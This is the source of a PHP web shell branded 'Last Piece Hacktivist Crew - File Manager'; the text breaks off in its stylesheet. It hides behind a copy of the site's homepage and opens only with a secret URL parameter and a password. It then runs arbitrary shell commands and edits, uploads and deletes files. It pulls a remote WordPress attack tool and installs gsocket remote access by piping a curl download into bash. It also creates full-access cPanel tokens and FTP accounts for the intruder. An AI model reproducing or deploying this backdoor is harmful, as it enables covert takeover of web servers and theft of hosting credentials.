<?php
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@error_reporting(0);
@set_time_limit(0);

$SECRET_PARAM = (isset($_GET['lastpiece']) && $_GET['lastpiece'] === 'hacktivist');
$PASSWORD_HASH = '$2a$12$5OVW/NAVmsGEZ2H23GyTCuTaGRI5iBDFoLzMsaYLtAUWpAfwrO85.';
$SESSION_NAME = 'lastpiece_auth';
$SESSION_TIMEOUT = 3600;

session_start();

function fetchHomepage() {
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
    $homeUrl = $scheme . '://' . $host . '/';
    
    $ctx = @stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "User-Agent: Mozilla/5.0\r\nAccept: text/html\r\n",
            'timeout' => 10,
            'ignore_errors' => true,
        ],
        'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
    ]);
    
    $homepage = @file_get_contents($homeUrl, false, $ctx);
    
    if ($homepage === false && function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $homeUrl,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0',
        ]);
        $homepage = curl_exec($ch);
        curl_close($ch);
    }
    
    return ($homepage !== false && strlen($homepage) > 100) ? $homepage : null;
}

function isAuthenticatedCheck() {
    global $SESSION_NAME, $SESSION_TIMEOUT;
    if (isset($_SESSION[$SESSION_NAME]) && isset($_SESSION[$SESSION_NAME . '_time'])) {
        if (time() - $_SESSION[$SESSION_NAME . '_time'] < $SESSION_TIMEOUT) {
            return true;
        }
    }
    return false;
}

if (!isAuthenticatedCheck()) {
    if (!$SECRET_PARAM) {
        $homepage = fetchHomepage();
        if ($homepage !== null) {
            echo $homepage;
            exit;
        }
        header('Location: /');
        exit;
    }
    
    $loginError = '';
    if (isset($_POST['login_password'])) {
        if (password_verify($_POST['login_password'], $PASSWORD_HASH)) {
            $_SESSION[$SESSION_NAME] = true;
            $_SESSION[$SESSION_NAME . '_time'] = time();
            $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
            $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
            $uri = $_SERVER['REQUEST_URI'] ?? '?lastpiece=hacktivist';
            header('Location: ' . $scheme . '://' . $host . $uri);
            exit;
        } else {
            $loginError = 'Invalid password';
        }
    }
    
    $homepage = fetchHomepage();
    if ($homepage !== null) {
        $loginForm = '
<style>
#_lp_overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.92);backdrop-filter:blur(8px);z-index:999999;justify-content:center;align-items:center;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
#_lp_overlay.show{display:flex}
#_lp_box{background:linear-gradient(145deg,#1a1a2e,#0d0d1a);padding:32px;border-radius:16px;border:1px solid rgba(255,215,0,0.2);box-shadow:0 25px 80px rgba(0,0,0,0.6),0 0 60px rgba(255,215,0,0.08);max-width:380px;width:90%;text-align:center}
#_lp_box h3{color:#ffd700;margin:0 0 6px;font-size:22px;font-weight:700}
#_lp_box p{color:#666;margin:0 0 24px;font-size:12px}
#_lp_box label{display:block;text-align:left;color:#888;font-size:11px;margin-bottom:6px;font-weight:500}
#_lp_box input{width:100%;padding:12px 14px;background:rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.1);color:#fff;border-radius:8px;font-size:14px;outline:none;box-sizing:border-box;transition:border-color 0.2s}
#_lp_box input:focus{border-color:#ffd700}
#_lp_box button{width:100%;padding:12px;background:linear-gradient(135deg,#ffd700,#ff8c00);border:none;border-radius:8px;color:#000;font-weight:700;font-size:14px;cursor:pointer;margin-top:16px;transition:transform 0.2s,box-shadow 0.2s}
#_lp_box button:hover{transform:translateY(-2px);box-shadow:0 6px 25px rgba(255,215,0,0.4)}
#_lp_box .hint{color:#444;font-size:10px;margin-top:16px}
#_lp_err{background:rgba(248,81,73,0.15);border:1px solid rgba(248,81,73,0.3);color:#f85149;padding:10px;border-radius:6px;margin-bottom:16px;font-size:12px}
</style>
<div id="_lp_overlay">
<form id="_lp_box" method="POST">
<h3>Access Portal</h3>
<p>Authentication Required</p>
' . ($loginError ? '<div id="_lp_err">' . htmlspecialchars($loginError) . '</div>' : '') . '
<label>Password</label>
<input type="password" name="login_password" id="_lp_pwd" placeholder="Enter password" required autocomplete="off">
<button type="submit">Authenticate</button>
<div class="hint">Press ESC to close</div>
</form>
</div>
<script>
document.addEventListener("keydown",function(e){
if(e.key==="p"||e.key==="P"){var o=document.getElementById("_lp_overlay");if(o){o.classList.toggle("show");if(o.classList.contains("show"))document.getElementById("_lp_pwd").focus();}}
if(e.key==="Escape"){var o=document.getElementById("_lp_overlay");if(o)o.classList.remove("show");}
});
</script>';
        $homepage = str_replace('</body>', $loginForm . '</body>', $homepage);
        echo $homepage;
        exit;
    }
    
    header('Location: /');
    exit;
}

@ob_clean();
@header("X-Accel-Buffering: no");
@header("Content-Encoding: none");

function isAuthenticated() {
    global $SESSION_NAME, $SESSION_TIMEOUT;
    if (isset($_SESSION[$SESSION_NAME]) && isset($_SESSION[$SESSION_NAME . '_time'])) {
        if (time() - $_SESSION[$SESSION_NAME . '_time'] < $SESSION_TIMEOUT) {
            $_SESSION[$SESSION_NAME . '_time'] = time();
            return true;
        } else {
            unset($_SESSION[$SESSION_NAME]);
            unset($_SESSION[$SESSION_NAME . '_time']);
        }
    }
    return false;
}

function authenticate($password) {
    global $PASSWORD_HASH, $SESSION_NAME;
    if (password_verify($password, $PASSWORD_HASH)) {
        $_SESSION[$SESSION_NAME] = true;
        $_SESSION[$SESSION_NAME . '_time'] = time();
        return true;
    }
    return false;
}

function logout() {
    global $SESSION_NAME;
    unset($_SESSION[$SESSION_NAME]);
    unset($_SESSION[$SESSION_NAME . '_time']);
    session_destroy();
}

function get_home_url() {
    $scheme = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http');
    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
    return $scheme . '://' . $host . '/';
}



if (isset($_GET['logout'])) {
    logout();
    header('Location: ?');
    exit;
}

$loginError = '';
if (isset($_POST['login_password'])) {
    if (authenticate($_POST['login_password'])) {
        header('Location: ?');
        exit;
    } else {
        $loginError = 'Invalid password';
    }
}

function getFileDetails($path) {
    $folders = [];
    $files = [];
    try {
        $items = @scandir($path);
        if (!is_array($items)) {
            throw new Exception('Failed to scan directory');
        }
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $itemPath = $path . '/' . $item;
            $isWritable = @is_writable($itemPath);
            $itemDetails = [
                'name' => $item,
                'type' => is_dir($itemPath) ? 'Folder' : 'File',
                'size' => is_dir($itemPath) ? '-' : formatSize(@filesize($itemPath)),
                'permission' => @substr(sprintf('%o', fileperms($itemPath)), -4),
                'modified' => @date('Y-m-d H:i', filemtime($itemPath)),
                'writable' => $isWritable
            ];
            if (is_dir($itemPath)) {
                $folders[] = $itemDetails;
            } else {
                $files[] = $itemDetails;
            }
        }
        return array_merge($folders, $files);
    } catch (Exception $e) {
        return [];
    }
}

function formatSize($size) {
    if ($size === false) return '-';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($size >= 1024 && $i < 4) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}

function executeCommand($command) {
    $currentDirectory = getCurrentDirectory();
    $command = "cd $currentDirectory && $command";
    $output = '';
    
    $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
    $process = @proc_open($command, $descriptors, $pipes);
    if (is_resource($process)) {
        fclose($pipes[0]);
        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        $error = stream_get_contents($pipes[2]);
        fclose($pipes[2]);
        proc_close($process);
        if (!empty($output)) return trim($output);
        if (!empty($error)) return 'Error: ' . trim($error);
    }
    
    $shellOutput = @shell_exec($command);
    if ($shellOutput !== null) return trim($shellOutput);
    
    @exec($command, $execOutput, $execStatus);
    if ($execStatus === 0) return implode(PHP_EOL, $execOutput);
    
    return 'Error: Command execution failed.';
}

function readFileContent($file) {
    return @file_get_contents($file);
}

function saveFileContent($file) {
    if (isset($_POST['content'])) {
        return @file_put_contents($file, $_POST['content']) !== false;
    }
    return false;
}

function uploadFile($targetDirectory) {
    if (isset($_FILES['file']) && $_FILES['file']['size'] > 0) {
        $targetFile = $targetDirectory . '/' . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
            return ['success' => true, 'message' => 'File uploaded: ' . basename($_FILES['file']['name'])];
        }
        return ['success' => false, 'message' => 'Upload failed'];
    }
    return ['success' => false, 'message' => 'Select a file first'];
}

function changeDirectory($path) {
    if ($path === '..') {
        @chdir('..');
    } else {
        @chdir($path);
    }
}

function getCurrentDirectory() {
    return realpath(getcwd());
}

function changePermission($path) {
    if (!file_exists($path)) return ['success' => false, 'message' => 'Not found'];
    $permission = isset($_POST['permission']) ? $_POST['permission'] : '';
    if ($permission === '') return ['success' => false, 'message' => 'Invalid permission'];
    $parsedPermission = intval($permission, 8);
    if ($parsedPermission === 0) return ['success' => false, 'message' => 'Invalid permission'];
    if (@chmod($path, $parsedPermission)) {
        return ['success' => true, 'message' => 'Permission changed'];
    }
    return ['success' => false, 'message' => 'Failed to change permission'];
}

function renameFile($oldName, $newName) {
    if (file_exists($oldName)) {
        $directory = dirname($oldName);
        $newPath = $directory . '/' . $newName;
        if (@rename($oldName, $newPath)) {
            return ['success' => true, 'message' => 'Renamed successfully'];
        }
        return ['success' => false, 'message' => 'Rename failed'];
    }
    return ['success' => false, 'message' => 'Not found'];
}

function deleteFile($file) {
    if (is_file($file)) {
        if (@unlink($file)) return ['success' => true, 'message' => 'File deleted'];
        return ['success' => false, 'message' => 'Delete failed'];
    }
    return ['success' => false, 'message' => 'Not found'];
}

function deleteFolder($folder) {
    if (is_dir($folder)) {
        $files = @glob($folder . '/*');
        foreach ($files as $file) {
            is_dir($file) ? deleteFolder($file) : @unlink($file);
        }
        if (@rmdir($folder)) return ['success' => true, 'message' => 'Folder deleted'];
        return ['success' => false, 'message' => 'Delete failed'];
    }
    return ['success' => false, 'message' => 'Not found'];
}

function scanDeepestDirectory($basePath) {
    $deepest = ['path' => $basePath, 'depth' => 0];
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($iterator as $item) {
        if ($item->isDir()) {
            $depth = $iterator->getDepth() + 1;
            if ($depth > $deepest['depth']) {
                $deepest = ['path' => $item->getPathname(), 'depth' => $depth];
            }
        }
    }
    return $deepest;
}

function scanNewlyFiles($basePath, $extension = 'php', $limit = 50) {
    $files = [];
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::LEAVES_ONLY
    );
    foreach ($iterator as $item) {
        if ($item->isFile()) {
            $ext = strtolower(pathinfo($item->getFilename(), PATHINFO_EXTENSION));
            if ($ext === $extension) {
                $files[] = [
                    'path' => $item->getPathname(),
                    'modified' => $item->getMTime()
                ];
            }
        }
    }
    usort($files, function($a, $b) {
        return $b['modified'] - $a['modified'];
    });
    return array_slice($files, 0, $limit);
}

function remoteUpload($url, $filename, $targetDir) {
    $content = @file_get_contents($url);
    if ($content === false) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $content = curl_exec($ch);
        curl_close($ch);
    }
    if ($content === false || empty($content)) {
        return ['success' => false, 'message' => 'Failed to download from URL'];
    }
    $targetPath = rtrim($targetDir, '/') . '/' . $filename;
    if (@file_put_contents($targetPath, $content) !== false) {
        return ['success' => true, 'message' => 'Remote file downloaded: ' . $filename];
    }
    return ['success' => false, 'message' => 'Failed to save file'];
}

function uploadMultipleFiles($targetDirectory) {
    $results = [];
    if (isset($_FILES['files']) && is_array($_FILES['files']['name'])) {
        $count = count($_FILES['files']['name']);
        for ($i = 0; $i < $count; $i++) {
            if ($_FILES['files']['error'][$i] === UPLOAD_ERR_OK && $_FILES['files']['size'][$i] > 0) {
                $targetFile = $targetDirectory . '/' . basename($_FILES['files']['name'][$i]);
                if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $targetFile)) {
                    $results[] = basename($_FILES['files']['name'][$i]);
                }
            }
        }
    }
    if (count($results) > 0) {
        return ['success' => true, 'message' => count($results) . ' files uploaded: ' . implode(', ', $results)];
    }
    return ['success' => false, 'message' => 'No files uploaded'];
}

function getFileIcon($type, $name) {
    if ($type === 'Folder') {
        return '<svg class="file-icon folder" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 20h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.93a2 2 0 0 1-1.66-.9l-.82-1.2A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13c0 1.1.9 2 2 2Z"/></svg>';
    }
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    $codeExts = ['php', 'js', 'ts', 'jsx', 'tsx', 'py', 'rb', 'java', 'c', 'cpp', 'h', 'css', 'scss', 'html', 'xml', 'json', 'sql'];
    $imageExts = ['jpg', 'jpeg', 'png', 'gif', 'svg', 'webp', 'ico', 'bmp'];
    $archiveExts = ['zip', 'rar', 'tar', 'gz', '7z'];
    
    if (in_array($ext, $codeExts)) {
        return '<svg class="file-icon code" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>';
    } elseif (in_array($ext, $imageExts)) {
        return '<svg class="file-icon image" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="18" height="18" x="3" y="3" rx="2" ry="2"/><circle cx="9" cy="9" r="2"/><path d="m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21"/></svg>';
    } elseif (in_array($ext, $archiveExts)) {
        return '<svg class="file-icon archive" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 8V5a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v3"/><path d="M21 16v3a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-3"/><path d="M4 12H2"/><path d="M10 12H8"/><path d="M16 12h-2"/><path d="M22 12h-2"/></svg>';
    }
    return '<svg class="file-icon file" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z"/><polyline points="14 2 14 8 20 8"/></svg>';
}

$currentDirectory = getCurrentDirectory();
$responseMessage = null;
$cmdOutput = '';

if (isAuthenticated()) {
    if (isset($_GET['nomi'])) {
        changeDirectory($_GET['nomi']);
        $currentDirectory = getCurrentDirectory();
    }
    
    if (isset($_GET['edit'])) {
        $file = $_GET['edit'];
        $content = readFileContent($file);
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
            $saved = saveFileContent($file);
            $responseMessage = $saved 
                ? ['success' => true, 'message' => 'File saved']
                : ['success' => false, 'message' => 'Save failed'];
        }
    }
    
    if (isset($_GET['chmod']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
        $responseMessage = changePermission($_GET['chmod']);
    }
    
    if (isset($_POST['upload'])) {
        $responseMessage = uploadFile($currentDirectory);
    }
    
    if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
        $cmdOutput = executeCommand($_POST['cmd']);
    }
    
    if (isset($_GET['rename']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
        $responseMessage = renameFile($_GET['rename'], $_POST['new_name']);
    }
    
    if (isset($_GET['delete'])) {
        $file = $_GET['delete'];
        $fileDirectory = dirname($file);
        if (is_file($file)) {
            $responseMessage = deleteFile($file);
        } elseif (is_dir($file)) {
            $responseMessage = deleteFolder($file);
        }
        if ($responseMessage && $responseMessage['success']) {
            echo "<script>window.location='?nomi=" . urlencode($fileDirectory) . "';</script>";
            exit;
        }
    }
    
    if (isset($_POST['Summon'])) {
        $baseUrl = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
        $filePath = $currentDirectory . '/Adminer.php';
        $fileContent = @file_get_contents($baseUrl);
        if ($fileContent !== false && @file_put_contents($filePath, $fileContent) !== false) {
            $responseMessage = ['success' => true, 'message' => 'Adminer downloaded'];
        } else {
            $responseMessage = ['success' => false, 'message' => 'Download failed'];
        }
    }
    
    if (isset($_POST['wordpress_tool'])) {
        $wpUrl = 'https://raw.githubusercontent.com/eclibesec/hastalavista/refs/heads/main/xt-wp.php';
        $wpFilePath = $currentDirectory . '/xt-wp.php';
        $wpContent = @file_get_contents($wpUrl);
        if ($wpContent !== false && @file_put_contents($wpFilePath, $wpContent) !== false) {
            echo "<script>window.location='" . basename($wpFilePath) . "';</script>";
            exit;
        } else {
            $responseMessage = ['success' => false, 'message' => 'WordPress tool download failed'];
        }
    }
    
    if (isset($_POST['gsocket_action']) && isset($_POST['gsocket_cmd'])) {
        $gsocketCommands = [
            'install_curl' => 'bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1',
            'install_wget' => 'bash -c "$(wget --no-verbose -O- https://gsocket.io/y)" 2>&1',
            'uninstall_curl' => 'GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1; pkill defunct 2>&1',
            'uninstall_wget' => 'GS_UNDO=1 bash -c "$(wget --no-verbose -O- https://gsocket.io/y)" 2>&1; pkill defunct 2>&1'
        ];
        $cmd = $_POST['gsocket_cmd'];
        if (isset($gsocketCommands[$cmd])) {
            $cmdOutput = @shell_exec($gsocketCommands[$cmd]);
            $responseMessage = ['success' => true, 'message' => 'GSocket command executed. Check output below.'];
        }
    }
    
    if (isset($_POST['cpanel_token'])) {
        $randomName = 'lp' . substr(md5(uniqid(mt_rand(), true)), 0, 8);
        $uapiOutput = @shell_exec('uapi Tokens create_full_access name=' . $randomName . ' 2>&1');
        
        $serverDomain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'unknown';
        $serverDomain = preg_replace('/^https?:\/\//', '', $serverDomain);
        $serverDomain = rtrim($serverDomain, '/');
        
        $serverUser = get_current_user();
        
        $token = 'Failed to generate';
        
        if (preg_match('/token:\s*[\'"]?([A-Z0-9]+)[\'"]?/i', $uapiOutput, $matches)) {
            $token = $matches[1];
        }
        
        $cmdOutput = "=== cPanel Token Generated ===\n\n";
        $cmdOutput .= "Domain  : " . $serverDomain . "\n";
        $cmdOutput .= "User    : " . $serverUser . "\n";
        $cmdOutput .= "Token   : " . $token . "\n";
        $cmdOutput .= "\n=== Copy Format ===\n";
        $cmdOutput .= $serverDomain . "|" . $serverUser . "|" . $token;
        
        $responseMessage = ['success' => true, 'message' => 'cPanel token generated successfully'];
    }
    
    if (isset($_POST['ftp_list'])) {
        $ftpOutput = @shell_exec('uapi --output=json Ftp list_ftp 2>&1');
        $ftpData = @json_decode($ftpOutput, true);
        
        $cmdOutput = "=== FTP Accounts List ===\n\n";
        if ($ftpData && isset($ftpData['result']['data']) && is_array($ftpData['result']['data'])) {
            foreach ($ftpData['result']['data'] as $ftp) {
                $cmdOutput .= "User   : " . ($ftp['user'] ?? 'N/A') . "\n";
                $cmdOutput .= "Domain : " . ($ftp['domain'] ?? 'N/A') . "\n";
                $cmdOutput .= "Dir    : " . ($ftp['homedir'] ?? 'N/A') . "\n";
                $cmdOutput .= "---\n";
            }
        } else {
            $cmdOutput .= "No FTP accounts found or failed to retrieve.\n";
        }
        $responseMessage = ['success' => true, 'message' => 'FTP list retrieved'];
    }
    
    if (isset($_POST['ftp_add']) && !empty($_POST['ftp_user']) && !empty($_POST['ftp_pass'])) {
        $ftpUser = $_POST['ftp_user'];
        $ftpPass = $_POST['ftp_pass'];
        $ftpQuota = !empty($_POST['ftp_quota']) ? $_POST['ftp_quota'] : '0';
        
        $homeDir = @shell_exec('echo $HOME 2>&1');
        $homeDir = trim($homeDir);
        if (empty($homeDir)) {
            $homeDir = '/home/' . get_current_user();
        }
        
        $addCmd = "uapi --output=json Ftp add_ftp user=" . escapeshellarg($ftpUser) . " pass=" . escapeshellarg($ftpPass) . " quota=" . escapeshellarg($ftpQuota) . " homedir=" . escapeshellarg($homeDir) . " 2>&1";
        $addOutput = @shell_exec($addCmd);
        $addData = @json_decode($addOutput, true);
        
        $cmdOutput = "=== FTP Account Creation ===\n\n";
        if ($addData && isset($addData['result']['status']) && $addData['result']['status'] == 1) {
            $cmdOutput .= "Status  : SUCCESS\n";
            $cmdOutput .= "User    : " . $ftpUser . "\n";
            $cmdOutput .= "Pass    : " . $ftpPass . "\n";
            $cmdOutput .= "Dir     : " . $homeDir . "\n";
            $responseMessage = ['success' => true, 'message' => 'FTP account created successfully'];
        } else {
            $error = $addData['result']['errors'][0] ?? 'Unknown error';
            $cmdOutput .= "Status  : FAILED\n";
            $cmdOutput .= "Error   : " . $error . "\n";
            $responseMessage = ['success' => false, 'message' => 'FTP creation failed'];
        }
    }
    
    if (isset($_POST['ftp_passwd']) && !empty($_POST['ftp_chg_user']) && !empty($_POST['ftp_chg_pass']) && !empty($_POST['ftp_chg_domain'])) {
        $chgUser = $_POST['ftp_chg_user'];
        $chgPass = $_POST['ftp_chg_pass'];
        $chgDomain = $_POST['ftp_chg_domain'];
        
        $passwdCmd = "uapi --output=json Ftp passwd user=" . escapeshellarg($chgUser) . " domain=" . escapeshellarg($chgDomain) . " pass=" . escapeshellarg($chgPass) . " 2>&1";
        $passwdOutput = @shell_exec($passwdCmd);
        $passwdData = @json_decode($passwdOutput, true);
        
        $cmdOutput = "=== FTP Password Change ===\n\n";
        if ($passwdData && isset($passwdData['result']['status']) && $passwdData['result']['status'] == 1) {
            $cmdOutput .= "Status  : SUCCESS\n";
            $cmdOutput .= "User    : " . $chgUser . "\n";
            $cmdOutput .= "Domain  : " . $chgDomain . "\n";
            $cmdOutput .= "NewPass : " . $chgPass . "\n";
            $responseMessage = ['success' => true, 'message' => 'FTP password changed'];
        } else {
            $error = $passwdData['result']['errors'][0] ?? 'Unknown error';
            $cmdOutput .= "Status  : FAILED\n";
            $cmdOutput .= "Error   : " . $error . "\n";
            $responseMessage = ['success' => false, 'message' => 'Password change failed'];
        }
    }
    
    if (isset($_POST['ftp_delete']) && !empty($_POST['ftp_del_user']) && !empty($_POST['ftp_del_domain'])) {
        $delUser = $_POST['ftp_del_user'];
        $delDomain = $_POST['ftp_del_domain'];
        
        $delCmd = "uapi --output=json Ftp delete_ftp user=" . escapeshellarg($delUser) . " domain=" . escapeshellarg($delDomain) . " 2>&1";
        $delOutput = @shell_exec($delCmd);
        $delData = @json_decode($delOutput, true);
        
        $cmdOutput = "=== FTP Account Deletion ===\n\n";
        if ($delData && isset($delData['result']['status']) && $delData['result']['status'] == 1) {
            $cmdOutput .= "Status  : SUCCESS\n";
            $cmdOutput .= "Deleted : " . $delUser . "@" . $delDomain . "\n";
            $responseMessage = ['success' => true, 'message' => 'FTP account deleted'];
        } else {
            $error = $delData['result']['errors'][0] ?? 'Unknown error';
            $cmdOutput .= "Status  : FAILED\n";
            $cmdOutput .= "Error   : " . $error . "\n";
            $responseMessage = ['success' => false, 'message' => 'FTP deletion failed'];
        }
    }
    
    if (isset($_POST['newfile']) && !empty($_POST['filename'])) {
        $newFilePath = $currentDirectory . '/' . $_POST['filename'];
        if (@file_put_contents($newFilePath, '') !== false) {
            $responseMessage = ['success' => true, 'message' => 'File created'];
        } else {
            $responseMessage = ['success' => false, 'message' => 'Create failed'];
        }
    }
    
    if (isset($_POST['scan_deep'])) {
        try {
            $result = scanDeepestDirectory($currentDirectory);
            $cmdOutput = "=== Deepest Directory Scan ===\n\n";
            $cmdOutput .= "Base Path : " . $currentDirectory . "\n";
            $cmdOutput .= "Deepest   : " . $result['path'] . "\n";
            $cmdOutput .= "Depth     : " . $result['depth'] . " levels\n";
            $responseMessage = ['success' => true, 'message' => 'Scan completed'];
        } catch (Exception $e) {
            $cmdOutput = "Error: " . $e->getMessage();
            $responseMessage = ['success' => false, 'message' => 'Scan failed'];
        }
    }
    
    if (isset($_POST['scan_newly'])) {
        try {
            $ext = !empty($_POST['scan_ext']) ? $_POST['scan_ext'] : 'php';
            $files = scanNewlyFiles($currentDirectory, $ext, 30);
            $cmdOutput = "=== Newly Modified Files (." . $ext . ") ===\n\n";
            foreach ($files as $file) {
                $cmdOutput .= date('Y-m-d H:i:s', $file['modified']) . " | " . $file['path'] . "\n";
            }
            if (empty($files)) {
                $cmdOutput .= "No files found.\n";
            }
            $responseMessage = ['success' => true, 'message' => count($files) . ' files found'];
        } catch (Exception $e) {
            $cmdOutput = "Error: " . $e->getMessage();
            $responseMessage = ['success' => false, 'message' => 'Scan failed'];
        }
    }
    
    if (isset($_POST['remote_upload']) && !empty($_POST['remote_url']) && !empty($_POST['remote_filename'])) {
        $result = remoteUpload($_POST['remote_url'], $_POST['remote_filename'], $currentDirectory);
        $responseMessage = $result;
        if ($result['success']) {
            $cmdOutput = "=== Remote Upload Success ===\n\n";
            $cmdOutput .= "URL  : " . $_POST['remote_url'] . "\n";
            $cmdOutput .= "File : " . $_POST['remote_filename'] . "\n";
            $cmdOutput .= "Path : " . $currentDirectory . "/" . $_POST['remote_filename'] . "\n";
        }
    }
    
    if (isset($_POST['multi_upload'])) {
        $result = uploadMultipleFiles($currentDirectory);
        $responseMessage = $result;
    }
    
    if (isset($_POST['mass_chmod']) && !empty($_POST['chmod_folder']) && !empty($_POST['chmod_file'])) {
        $folderPerm = $_POST['chmod_folder'];
        $filePerm = $_POST['chmod_file'];
        $targetPath = !empty($_POST['chmod_path']) ? $_POST['chmod_path'] : $currentDirectory;
        
        $folderCount = 0;
        $fileCount = 0;
        $errors = [];
        
        try {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            
            foreach ($iterator as $item) {
                $path = $item->getPathname();
                if ($item->isDir()) {
                    if (@chmod($path, octdec($folderPerm))) {
                        $folderCount++;
                    } else {
                        $errors[] = "Failed: " . $path;
                    }
                } else {
                    if (@chmod($path, octdec($filePerm))) {
                        $fileCount++;
                    } else {
                        $errors[] = "Failed: " . $path;
                    }
                }
            }
            
            if (@chmod($targetPath, octdec($folderPerm))) {
                $folderCount++;
            }
            
            $cmdOutput = "=== Mass Chmod Result ===\n\n";
            $cmdOutput .= "Target Path   : " . $targetPath . "\n";
            $cmdOutput .= "Folder Perm   : " . $folderPerm . "\n";
            $cmdOutput .= "File Perm     : " . $filePerm . "\n";
            $cmdOutput .= "---\n";
            $cmdOutput .= "Folders Fixed : " . $folderCount . "\n";
            $cmdOutput .= "Files Fixed   : " . $fileCount . "\n";
            
            if (count($errors) > 0) {
                $cmdOutput .= "\nErrors (" . count($errors) . "):\n";
                foreach (array_slice($errors, 0, 10) as $err) {
                    $cmdOutput .= $err . "\n";
                }
                if (count($errors) > 10) {
                    $cmdOutput .= "... and " . (count($errors) - 10) . " more\n";
                }
            }
            
            $responseMessage = ['success' => true, 'message' => 'Mass chmod completed'];
        } catch (Exception $e) {
            $cmdOutput = "Error: " . $e->getMessage();
            $responseMessage = ['success' => false, 'message' => 'Mass chmod failed'];
        }
    }
    
    if (isset($_POST['newfolder']) && !empty($_POST['foldername'])) {
        $newFolderPath = $currentDirectory . '/' . $_POST['foldername'];
        if (@mkdir($newFolderPath, 0755)) {
            $responseMessage = ['success' => true, 'message' => 'Folder created'];
        } else {
            $responseMessage = ['success' => false, 'message' => 'Create failed'];
        }
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Last Piece Hacktivist Crew - File Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        :root {
            --bg-dark: #0a0e1a;
            --bg-card: #111827;
            --bg-input: #0d1321;
            --border: #1e3a5f;
            --border-light: #1a2744;
            --text: #c9d1d9;
            --text-muted: #6b8aaa;
            --text-bright: #f0f6fc;
            --accent: #00d4ff;
            --green: #00d4ff;
            --gold: #d4a520;
            --orange: #e07020;
            --red: #f85149;
            --purple: #a371f7;
            --ocean: #0f4c81;
            --ocean-light: #1a6faa;
            --glow-cyan: rgba(0, 212, 255, 0.3);
            --glow-gold: rgba(212, 165, 32, 0.3);
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            background: var(--bg-dark);
            color: var(--text);
            min-height: 100vh;
            font-size: 14px;
            line-height: 1.5;
        }
        
        .video-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            overflow: hidden;
        }
        
        .video-background video {
            position: absolute;
            top: 50%;
            left: 50%;
            min-width: 100%;
            min-height: 100%;
            width: auto;
